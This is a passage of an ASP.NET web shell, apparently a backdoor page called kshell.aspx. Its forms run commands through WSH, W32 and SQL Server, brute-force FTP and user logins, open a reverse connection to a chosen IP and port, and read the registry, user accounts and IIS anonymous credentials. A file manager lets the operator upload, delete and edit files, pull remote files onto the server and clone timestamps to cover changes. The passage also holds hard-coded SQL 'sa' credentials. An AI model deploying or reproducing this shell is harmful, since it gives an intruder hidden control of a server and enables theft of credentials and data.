      <asp:TextBox ID="IpAddress" runat="server" style="width:150px;" class="TextBox" Text="127.0.0.1"/>&nbsp; &nbsp; &nbsp;
      <asp:checkbox id="CheckBoxPeer" runat="server" Text="Peer" ></asp:checkbox>&nbsp; &nbsp; &nbsp; &nbsp; 
      Concatenation User:&nbsp;
      <asp:TextBox ID="ConcatUser" runat="server" Width="107px" class="TextBox" />&nbsp;&nbsp;
      <asp:CheckBox ID="CheckDashSplit" runat="server" Text="Dash Split" /><br />
      password:&nbsp;
      <asp:TextBox ID="CheckPassword" runat="server" style="width:150px;" class="TextBox" Text="1q2w3e4r"/>
      &nbsp; &nbsp; &nbsp;<asp:CheckBox ID="CheckBoxAtHomeUser" runat="server" Text="AtHome" />
      &nbsp;&nbsp; Concatenation Pass: &nbsp;<asp:TextBox ID="Concat" runat="server" Width="107px" class="TextBox" Text="123"/>
      &nbsp;&nbsp;
      <asp:CheckBox ID="CheckBoxReverseFtp" runat="server" Text="Reverse Password" /><br />
      Remove:&nbsp; &nbsp; 
      <asp:TextBox ID="CheckRemove" runat="server" style="width:150px;" class="TextBox" Text="."></asp:TextBox>
      &nbsp; &nbsp; &nbsp;<asp:CheckBox ID="CheckBoxRemove" runat="server" Text="From String" />&nbsp;
      <asp:Button ID="ButtonFtpBrute" runat="server" Text="Start" OnClick="RunFtpBrute" class="buttom"/> </p>
  <p>
   <asp:Label ID="resultFtpBrute" runat="server" style="style2"/>      
    </p>
</form>

<%
	case "localgroup"
%>
<form id="Form5" runat="server">
  <p>[ local group  for WebAdmin ]        <i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> local group with ASP.NET account(<span class="style3">Notice: only click "Start" to start Enumerating</span>)</p>
  <p>- This function has fixed by Tatra has not detected (2009/04/17)-</p>
  <p>
      Select Group:&nbsp; 
     <asp:DropDownList id="lb1local" runat="server"></asp:DropDownList>
     <asp:Button ID="ButtonLocalGroupUser" runat="server" Text="Start" OnClick="LocalGroupUser" class="buttom"/>  
  </p>
  <p>
   <asp:Label ID="resultLocalGroupUser" runat="server" style="style2"/>      
    </p>
</form>

<%
	case "UserEnumLogin"
%>
   <form id="Form6" runat="server">
  <p>[ User Enum Login  for WebAdmin ]        <i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> User Enum Login with ASP.NET account(<span class="style3">Notice: only click "Start" to start brute</span>)</p>
  <p>- This function has fixed by Tatra has not detected (2009/04/17)-</p>
  <p>Domain / Ip : 
      <asp:TextBox ID="DomaineName" runat="server" Width="134px" class="TextBox" Text="127.0.0.1"/>
      &nbsp;&nbsp;&nbsp;
	  <asp:checkbox id="CheckBoxRemotlyServer" runat="server" Text="Remotly Server" ></asp:checkbox>
	  User Name: &nbsp; &nbsp;
      <asp:TextBox ID="UserNameRemotly" runat="server" Width="134px" class="TextBox"/>
	  User Password: &nbsp; &nbsp;
      <asp:TextBox ID="UserPassword" runat="server" Width="134px" class="TextBox"/>
      <br />
      password: &nbsp; &nbsp;
      <asp:TextBox ID="CheckPasswordUser" runat="server" Width="134px" class="TextBox" Text="1q2w3e4r"/>
      &nbsp; Add To Name:<asp:TextBox ID="ConcatPasswordUser" runat="server" Width="132px" class="TextBox" Text="123"/>
  <asp:checkbox id="CheckBoxAtHome" runat="server" Text="At Home" ></asp:checkbox><br />
      Remove :&nbsp; &nbsp; &nbsp; <asp:TextBox ID="RemoveStringPassword" runat="server" Width="134px" class="TextBox" Text="ftp"/>
  <asp:checkbox id="CheckRemovestring" runat="server" Text="Remove String" ></asp:checkbox>&nbsp;
  <asp:CheckBox ID="CheckBoxReverse" runat="server" Text="Reverse Password" />
      &nbsp;&nbsp; &nbsp;<asp:Button ID="ButtonUserEnumLogin" runat="server" Text="Start" OnClick="RunUserEnumLogin" class="buttom"/>  
  <p><asp:Label ID="resultUserEnumLogin" runat="server" style="style2"/>    
  </p>
</form>

<%
	case "cmdw32"
%>
<form id="Form7" runat="server">
	<p>[ ASP.NET W32 Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  	<p> Execute command with ASP.NET account using W32(<span class="style3">Notice: only click "Run" to run</span>)</p>
  	Command:
	<asp:TextBox ID="txtCommand1" runat="server" style="border: 1px solid #084B8E"/>
  	<asp:Button ID="Buttoncmdw32" runat="server" Text="Run" OnClick="RunCmdW32" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
  	<p>
    <asp:Label ID="resultcmdw32" runat="server" style="color: #0000FF"/>      
    </p>
</form>
<%
	case "cmdwsh"
%>
<form id="Form8" runat="server">
	<p>[ ASP.NET WSH Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  	<p> Execute command with ASP.NET account using WSH(<span class="style3">Notice: only click "Run" to run</span>)</p>
  	Command:
	<asp:TextBox ID="txtCommand2" runat="server" style="border: 1px solid #084B8E"/>
  	<asp:Button ID="Buttoncmdwsh" runat="server" Text="Run" OnClick="RunCmdWSH" style="color: #FFFFFF; border: 1px solid #084B8E; background-color: #719BC5"/>  
  	<p>
    <asp:Label ID="resultcmdwsh" runat="server" style="color: #0000FF"/>      
    </p>
</form>
<%
	case "pro"
%>
<form id="Form9" runat="server">
	<p align=center>[ List processes from server ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				Try
			        output_wmi_function_data("Win32_Process", "Name,ProcessId,WorkingSetSize,HandleCount")
			    Catch
			        'rw("This function is disabled by server")
			        Dim htmlbengin As String = "<table width='80%' align=center border=0><tr align=center><td width='20%'><b>ID</b></td><td align=left width='20%'><b>Process</b></td><td align=left width='20%'><b>MemorySize</b></td><td align=center width='10%'><b>Threads</b></td></tr>"
			        Dim prostr As String = ""
			        Dim htmlend As String = "</tr></table>"
			        Try
			            Dim mypro As Process() = Process.GetProcesses()
			            For Each p As Process In mypro
			                prostr += "<tr><td align=center>" + p.Id.ToString() + "</td>"
			                prostr += "<td align=left>" + p.ProcessName.ToString() + "</td>"
			                prostr += "<td align=left>" + p.WorkingSet.ToString() + "</td>"
			                prostr += "<td align=center>" + p.Threads.Count.ToString() + "</td>"
			            Next
			        Catch ex As Exception
			            Response.Write(ex.Message)
			        End Try
			        Response.Write(htmlbengin + prostr + htmlend)
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
Case "ReverseConnection"
%>
<form id="FormReverseConnection" runat="server">
	<p align=center>[ Ftp Switch ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	IP Client:
    <asp:TextBox ID="IpReverseConnection" runat="server" style="width:150px;" class="TextBox" Text="192.168.0.110"/>
    Port:
    <asp:TextBox ID="PortReverseConnection" runat="server" style="width:150px;" class="TextBox" Text="6666"/>
    <asp:Button ID="ButtonReverseConnection" runat="server" Text="Connect" OnClick="RunReverseConnection" class="buttom"/>      
    <p>
   <asp:Label ID="LabelReverseConnection" runat="server" style="style2"/>      </p>
</form>
<%
Case "FtpSwitch"
%>
<form id="FormFtpSwitch" runat="server">
	<p align=center>[ Ftp Switch ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	Ftp Server:
    <asp:TextBox ID="ftpServerIP" runat="server" style="width:150px;" class="TextBox" Text="192.168.0.21"/>
    User Name:
    <asp:TextBox ID="ftpUserID" runat="server" style="width:150px;" class="TextBox" Text="usaername"/>
    User Password:
    <asp:TextBox ID="ftpPassword" runat="server" style="width:150px;" class="TextBox" Text="password"/>
    <asp:TextBox ID="ftproot" runat="server" style="width:150px;" class="TextBox" Text="/"/>
    <asp:Button ID="ButtonftpConnect" runat="server" Text="Connect" OnClick="RunftpConnect" class="buttom"/>      
    <p>
   <asp:Label ID="LabelFtpSwitch" runat="server" style="style2"/>      </p>
</form>
<%
Case "GetNetworkComputers"
%>
<form id="Form22" runat="server">
	<p align=center>[ Network Computers ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
     <table border='3' align=center width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>Nb<b></font></td><td align=center><font color=white><b>Server<b></font></td><td align=center><font color=white><b>Ip<b></font></td></tr>
		<tr>
			<td>
			<% 
			    Dim NetViewEnum As ArrayList = GetNetViewEnumUseNetapi32()
			    Dim i As Integer = 1
			    For Each NetView As String In NetViewEnum
			        Try
			            Dim hostInfo As IPHostEntry = Dns.GetHostByName(NetView)
			            Dim ip_addrs As IPAddress() = hostInfo.AddressList
			            For Each ip As IPAddress In ip_addrs
			                    %>
			                    <tr>
			                    <td><b><% Response.Write(i)%> </b></td>
			                    <td><b>\\<% Response.Write(NetView)%> </b></td>
			                    <td><b><% Response.Write(ip.ToString())%> </b></td>
			                    </tr>
			                    <%
			                    Next
                            Catch
			                    %>
			                    <tr>
			                    <td><b><% Response.Write(i)%> </b></td>
			                    <td><b>\\<% Response.Write(NetView)%> </b></td>
			                    <td><b><% Response.Write("Not Found")%> </b></td>
			                    </tr>
			                    <%
			                    End Try
			                    i = i + 1
                            Next
			%>
			</td>
		</tr>
	</table>
</form>
<%
Case "homedirectory"
%>
<form id="Form21" runat="server">
	<p align=center>[ Home Directory Accounts ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table border='3' align=center width ='' height=''><tr bgcolor=black><td align=center><font color=white><b>UserName<b></font></td><td align=center><font color=white><b>HomeDirectory<b></font></td><td align=center><font color=white><b>Last logon<b></font></td><td align=center><font color=white><b>Password last set<b></font></td></tr>
		<tr>
			<td>
			<% 
				Dim oIADs, oUser, lastlogin, Passwordlastset
				Dim oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
                Dim oContainer = GetObject("WinNT://" & oScriptNet.ComputerName & "")
        
                For Each oIADs In oContainer
                     If (oIADs.Class = "User") Then
                      oUser = oIADs
                      Try
			             lastlogin = oUser.lastlogin.ToString()
				      Catch
			             lastlogin = "Never"
				      End Try
				      Passwordlastset = DateAdd("s",-oUser.PasswordAge,Now())
                      Response.Write("<tr><td>"+oUser.Name+"</td>")
                      Response.Write("<td>"+oUser.HomeDirectory+"</td>")
                      Response.Write("<td>"+lastlogin+"</td>")
                      Response.Write("<td>"+FormatDateTime(Passwordlastset, 1).ToString()+","+FormatDateTime(Passwordlastset, 3).ToString()+"</td></tr>")
                     End If
                Next
			%>
			</td>
		</tr>
	</table>
</form>

<%
	case "user"
%>
<form id="Form10" runat="server">
	<p align=center>[ List User Accounts ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_UserAccount"		
				dim Fields_to_load = "Name,Domain,FullName,Description,PasswordRequired,SID"
				dim fail_description = " Access to " + WMI_function + " is protected"
				Try
				output_wmi_function_data(WMI_function,Fields_to_load)
				Catch
				rw(fail_description)
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "reg"
%>
<form id="Form11" runat="server">
	<p align=center>[ Registry ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_Registry"		
				dim Fields_to_load = "Caption,CurrentSize,Description,InstallDate,Name,Status"
				dim fail_description = " Access to " + WMI_function + " is protected"
				Try
			        '  output_wmi_function_data(WMI_function, Fields_to_load)
			        Dim oReg, strKeyPath, arrValueNames, arrValueTypes, i, strValue
			        Const HKEY_LOCAL_MACHINE = &H80000002
			        Dim strComputer = "."
			        oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")
			        strKeyPath = "SOFTWARE\Psoft\HSphere\Settings"
			        oReg.EnumValues(HKEY_LOCAL_MACHINE, strKeyPath, arrValueNames, arrValueTypes)
 
			        For i = 0 To UBound(arrValueNames)
			            Response.Write("File Name: " & arrValueNames(i) & " -- ")
			            oReg.GetStringValue(HKEY_LOCAL_MACHINE, strKeyPath, arrValueNames(i), strValue)
			            Response.Write("Location: " & strValue)
			            Response.Write("<br>")
			        Next
			        
			        ' Dim oADSIObject, oContainer
			        'oADSIObject = GetObject("winmgmts:")
			        'oContainer = oADSIObject.OpenDSObject("winmgmts:{impersonationLevel=impersonate}!\\" & "2003_PLESK_9_2" & "\root\default:StdRegProv", "Administrator", "12345678", 0)
			        
			        'strKeyPath = "SOFTWARE\SmarterTools\SmarterMail"
			        'oContainer.EnumValues(HKEY_LOCAL_MACHINE, strKeyPath, arrValueNames, arrValueTypes)
			       			        
			        ' Dim oIADs
			        ' Dim oContainer = GetObject("winmgmts:\\" & strComputer & "\root\default:StdRegProv")
			        '  For Each oIADs In oContainer
			        ' Response.Write(oIADs.Class())
			        ' Response.Write("1<br>")
			        '  Next
			        
			    Catch ex As Exception
			        Response.Write(ex.Message)
			        ' rw(fail_description)
			    End Try
			    
			    ' Dim winmgmt As String = "winmgmts:\\2003_PLESK_9_2\root\default:StdRegProv"
			    ' Try
			    'Dim mydir As New DirectoryEntry(winmgmt, "username", "password", 0)
			    'Dim strKeyPath1 = "SOFTWARE\SmarterTools\SmarterMail"
			    'Response.Write(mydir.Username)
			    'Catch
			    ' rw(fail_description)
			    'End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "applog"
%>
<form id="Form12" runat="server">
	<p align=center>[ List Application Event Log Entries ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_NTLogEvent where Logfile='Application'"		
				dim Fields_to_load = "Logfile,Message,type"
				dim fail_description = " Access to " + WMI_function + " is protected"
				Try
				output_wmi_function_data_instances(WMI_function,Fields_to_load,2000)
				Catch
				rw(fail_description)
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "syslog"
%>
<form id="Form13" runat="server">
	<p align=center>[ List System Event Log Entries ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				dim WMI_function = "Win32_NTLogEvent where Logfile='System'"		
				dim Fields_to_load = "Logfile,Message,type"
				dim fail_description = " Access to " + WMI_function + " is protected"
				
				Try
				output_wmi_function_data_instances(WMI_function,Fields_to_load,2000)
				Catch
				rw("This function is disabled by server")
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "auser"
%>
<form id="Form14" runat="server">
	<p align=center>[ IIS List Anonymous' User details ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
				Try
				IIS_list_Anon_Name_Pass
				Catch
				rw("This function is disabled by server")
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "ipconfig"
%>
<form id="Form15" runat="server">
	<p align=center>[ Ip Configuration ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
	<table align=center>
		<tr>
			<td>
			<% 
    Try
    Dim wsh,EnableTCPIPKey,ApdKey,Apds,ApdB,Path,i,j,IPKey,IPaddr,GateWayKey,GateWay,DNSKey,DNSstr
                                Dim isEnable As Integer
                                Dim Notcpipfilter As Integer
                                wsh = Server.CreateObject("WSCRIPT.SHELL")
EnableTCPIPKey="HKLM\SYSTEM\currentControlSet\Services\Tcpip\Parameters\EnableSecurityFilters"
                                isEnable=Wsh.Regread(EnableTcpipKey)

                                ApdKey="HKLM\SYSTEM\ControlSet001\Services\Tcpip\Linkage\Bind"
                                Apds=Wsh.RegRead(ApdKey)
If IsArray(Apds) Then 
      For i=LBound(Apds) To UBound(Apds)-1
        ApdB=Replace(Apds(i),"\Device\","")
        Response.Write ("<b>Device " & i & " Interface: " & ApdB & "</b><br>")
        Path="HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip\Parameters\Interfaces\"

IPKey=Path & ApdB & "\IPAddress"
        IPaddr=Wsh.Regread(IPKey)
        If IPaddr(0)<>"" Then
          For j=Lbound(IPAddr) to Ubound(IPAddr)
            Response.Write ("<li><b>IP Adress............: " & IPAddr(j) & "</b><br>")
          Next
        Else
          Response.Write ("<li><b>IP Adress: " & j &" Is: Blank</b><br>")
        End if

GateWayKey=Path & ApdB & "\DefaultGateway"
        GateWay=Wsh.Regread(GateWayKey)
        If isarray(GateWay) Then
          For j=Lbound(Gateway) to Ubound(Gateway)
            Response.Write ("<li><b>Default Gateway............" & Gateway(j) & "<br></b>")
          Next
        Else
          Response.Write ("<li><b> Default Gateway: " & j & " Is: Blank</b><br>")
        End if

DNSKey=Path & ApdB & "\NameServer"
        DNSstr=Wsh.RegRead(DNSKey)
        If DNSstr<>"" Then
          Response.Write ("<li><b>DNS Servers............ " & DNSstr & "<br></b>")
        Else
          Response.Write ("<li><b>DNS Server Is: Blank</b><br>")
        End If

Next
    end if
                                Catch
				rw("This function is disabled by server")
				End Try
			%>
			</td>
		</tr>
	</table>
</form>
<%
	case "sqlrootkit"
%>
<form id="Formsqlrootkit" runat="server">
  <p>[ SqlRootKit.NET for WebAdmin ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Execute command with SQLServer account(<span class="style3">Notice: only click "Run" to run</span>)</p>
  <p>Host:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <asp:TextBox ID="ip" runat="server" class="TextBox" Text="127.0.0.1" style="width:150px;"/></p>
  <p>
  SQL Name:
    <asp:TextBox ID="SqlName" runat="server" style="width:150px;" class="TextBox" Text="sa"/>
  SQL Password:
    <asp:TextBox ID="SqlPass" runat="server" style="width:150px;" class="TextBox" Text="Sj60IxnpP70O"/>
  </p>
  Command:
  <asp:TextBox ID="Sqlcmd" runat="server" style="width:407px;" class="TextBox"/>
  <asp:Button ID="ButtonSQL" runat="server" Text="Run" OnClick="RunSQLCMD" class="buttom"/>  
  <p>
   <asp:Label ID="resultSQL" runat="server" style="style2"/></p>
</form>

<%
case "regshell"
%>
	<form id="Formregshell" runat="server">
	<p align=center >[ Registry Shell ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  	Key:&nbsp;&nbsp;
  	<asp:TextBox ID="TextRegKey" runat="server" style="width:600px;" class="TextBox" Text="HKEY_LOCAL_MACHINE\"/>
	<asp:Button ID="ButtonReadReg" runat="server" Text="Reg Query" OnClick="RegistryRead" class="buttom"/> 
	<p>
	<asp:Label ID="resultregshell" runat="server" style="style2"/></p>
	</form>
<%
	case "DbManager"
%>
<form id="FormDbManager" runat="server">
  <p>[ Data Base Manager for CaterPillar ]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i><a href="javascript:history.back(1);">Back</a></i></p>
  <p> Select command with Data Base Manager account(<span class="style3">Notice: only click "Connect" to Connect</span>)</p>
  <p>Host Name:
    <asp:TextBox ID="DbManagerServerName" runat="server" style="width:200px;" class="TextBox" Text="127.0.0.1"/>
  Database:
	<asp:TextBox ID="DbManagerDatabase" runat="server" style="width:454px;" class="TextBox" Text="sitebuilder6B9211A62CB55F240B1BC07587F345CA"/>
	  
  <p>
  User Name:
    <asp:TextBox ID="DbManagerUserName" runat="server" style="width:200px;" class="TextBox" Text="sa"/>
  Password:
  <asp:TextBox ID="DbManagerPass" runat="server" style="width:200px;" class="TextBox" Text="Sj60IxnpP70O"/>
  Driver:
  <asp:TextBox ID="DbManagerDriver" runat="server" style="width:200px;" class="TextBox" Text="Driver=SQL Server"/>
  </p>
  Command:&nbsp;
  <asp:TextBox ID="DbManagerTable" runat="server" style="width:201px;" class="TextBox"/>
  <asp:Button ID="ButtonDbManager" runat="server" Text="Connect" OnClick="RunDbManager" class="buttom"/>  
  <p>
   <asp:Label ID="LabelDbManager" runat="server" style="style2"/>      </p>
</form>
<%
	case "del"
		dim a as string
		a=request.QueryString("src")
		call existdir(a)
		call del(a)  
		response.Write("<script>alert(""Delete " & replace(a,"\","\\") & " Success!"");location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(a)) &"'</script>")
	case "copy"
		call existdir(request.QueryString("src"))
		session("cutboard")="" & request.QueryString("src")
		response.Write("<script>alert('File info have add the cutboard, go to target directory click paste!');location.href='JavaScript:self.close()';</script>")
	case "cut"
		call existdir(request.QueryString("src"))
		session("cutboard")="" & request.QueryString("src")
		response.Write("<script>alert('File info have add the cutboard, go to target directory click paste!');location.href='JavaScript:self.close()';</script>")
	case "paste"
		dim ow as integer
		if request.Form("OverWrite")<>"" then ow=1
		if request.Form("Cancel")<>"" then ow=2
		url=request.QueryString("src")
		call existdir(url)
		dim d as string
		d=session("cutboard")
		if left(d,1)="" then
			TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
			TEMP2=url & replace(path.getfilename(d),"","")
			if right(d,1)="\" then   
				call xexistdir(TEMP1,ow)
				directory.move(replace(d,"",""),TEMP1 & "\")  
				response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
			else
				call xexistdir(TEMP2,ow)
				file.move(replace(d,"",""),TEMP2)
				response.Write("<script>alert('Cut  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
			end if
		else
			TEMP1=url & path.getfilename(mid(replace(d,"",""),1,len(replace(d,"",""))-1))
			TEMP2=url & path.getfilename(replace(d,"",""))
			if right(d,1)="\" then 
				call xexistdir(TEMP1,ow)
				directory.createdirectory(TEMP1)
				call copydir(replace(d,"",""),TEMP1 & "\")
				response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP1 & "\","\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
			else
				call xexistdir(TEMP2,ow)
				file.copy(replace(d,"",""),TEMP2)
				response.Write("<script>alert('Copy  " & replace(replace(d,"",""),"\","\\") & "  to  " & replace(TEMP2,"\","\\") & "  success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(url) &"'</script>")
			end if
		end if
	case "upfile"
		url=request.QueryString("src")
%>
<form id="Form17" name="UpFileForm" enctype="multipart/form-data" method="post" action="?src=<%=server.UrlEncode(url)%>" runat="server"  onSubmit="return checkname();">
 You will upload file to this directory : <span class="style3"><%=url%></span><br>
 Please choose file from your computer :
 <input name="upfile" type="file" class="TextBox" id="UpFile" runat="server">
    <input type="submit" id="UpFileSubit" value="Upload" runat="server" onserverclick="UpLoad" class="buttom">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back </a>
<%
Case "downloadfile"
    url = Request.QueryString("src")
%>
<form id="FormDownloadFile" name="DownloadFileForm" enctype="multipart/form-data" method="post" action="?src=<%=server.UrlEncode(url)%>" runat="server"  onSubmit="return checkname();">
 You will download file to this directory : <span class="style3"><%=url%></span><br>
 Please choose file from server :
 <asp:TextBox ID="downloadfile" runat="server" style="width:350px;" class="TextBox" Text="http://www.../filename..."/>
 Save As File :
 <asp:TextBox ID="SaveAsFile" runat="server" style="width:150px;" class="TextBox" Text="filename...."/>
 <input type="submit" id="DownloadFileSubit" value="Download" runat="server" onserverclick="DownloadFileRemote" class="buttom">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back </a>
<%
	case "new"
		url=request.QueryString("src")
%>
<form id="Form18" runat="server">
  <%=url%><br>
  Name:
  <asp:TextBox ID="NewName" TextMode="SingleLine" runat="server" class="TextBox"/>
  <br>
  <asp:RadioButton ID="NewFile" Text="File" runat="server" GroupName="New" Checked="true"/>
  <asp:RadioButton ID="NewDirectory" Text="Directory" runat="server"  GroupName="New"/> 
  <br>
  <asp:Button ID="NewButton" Text="Submit" runat="server" CssClass="buttom"  OnClick="NewFD"/>  
  <input name="Src" type="hidden" value="<%=url%>">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
<%
	case "edit"
		dim b as string
		b=request.QueryString("src")
		call existdir(b)
		dim myread as new streamreader(b,encoding.default)
		filepath.text=b
		content.text=myread.readtoend
%>
<form id="Form19" runat="server">
  <table width="80%"  border="1" align="center">
    <tr>      <td width="11%">Path</td>
      <td width="89%">
      <asp:TextBox CssClass="TextBox" ID="filepath" runat="server" Width="300"/>
      *</td>
    </tr>
    <tr>
      <td>Content</td> 
      <td> <asp:TextBox ID="content" Rows="25" Columns="100" TextMode="MultiLine" runat="server" CssClass="TextBox"/></td>
    </tr>
    <tr>
      <td></td>
      <td> <asp:Button ID="a" Text="Sumbit" runat="server" OnClick="Editor" CssClass="buttom"/>         
      </td>
    </tr>
  </table>
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
<%
  		myread.close
	case "rename"
		url=request.QueryString("src")
		if request.Form("name")="" then
	%>
<form name="formRn" method="post" action="?action=rename&src=<%=server.UrlEncode(request.QueryString("src"))%>" onSubmit="return checkname();">
  <p>You will rename <span class="style3"><%=request.QueryString("src")%></span>to: <%=getparentdir(request.QueryString("src"))%>
    <input type="text" name="name" class="TextBox">
    <input type="submit" name="Submit3" value="Submit" class="buttom">
</p>
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
<script language="javascript">
function checkname()
{
if(formRn.name.value==""){alert("You shall input filename :(");return false}
}
</script>
  <%
		else
			if Rename() then
				response.Write("<script>alert('Rename " & replace(url,"\","\\") & " to " & replace(Getparentdir(url) & request.Form("name"),"\","\\") & " Success!');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
			else
				response.Write("<script>alert('Exist the same name file , rename fail :(');location.href='"& request.ServerVariables("URL") & "?action=goto&src="& server.UrlEncode(Getparentdir(url)) &"'</script>")
			end if
		end if
	case "samename"
		url=request.QueryString("src")
%>
<form name="form1" method="post" action="?action=paste&src=<%=server.UrlEncode(url)%>">
<p class="style3">Exist the same name file , can you overwrite ?(If you click " no" , it will auto add a number as prefix)</p>
  <input name="OverWrite" type="submit" id="OverWrite" value="Yes" class="buttom">
<input name="Cancel" type="submit" id="Cancel" value="No" class="buttom">
</form>
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
   <%
    case "clonetime"
		time1.Text=request.QueryString("src")&"kshell.aspx"
		time2.Text=request.QueryString("src")
	%>
<form id="Form20" runat="server">
  <p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:history.back(1);">Back</a></i> </p>
  <p>A tool that it copy the file or directory's time to another file or directory </p>
  <p>Rework File or Dir:
    <asp:TextBox CssClass="TextBox" ID="time1" runat="server" Width="300"/></p>
  <p>Copied File or Dir:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
    <asp:TextBox CssClass="TextBox" ID="time2" runat="server" Width="300"/></p>
<asp:Button ID="ButtonClone" Text="Submit" runat="server" CssClass="buttom" OnClick="CloneTime"/>
</form>
<p>
  <%
	case "logout"
   		session.Abandon()
		response.Write("<script>alert(' Goodbye !');location.href='" & request.ServerVariables("URL") & "';</sc" & "ript>")
	end select
end if
Catch error_x
	response.Write("<font color=""red"">Wrong: </font>"&error_x.Message)
End Try
%>
</p>
</p>
<hr>
<script language="javascript">
function closewindow()
{self.close();}
</script>
</body>
</html>



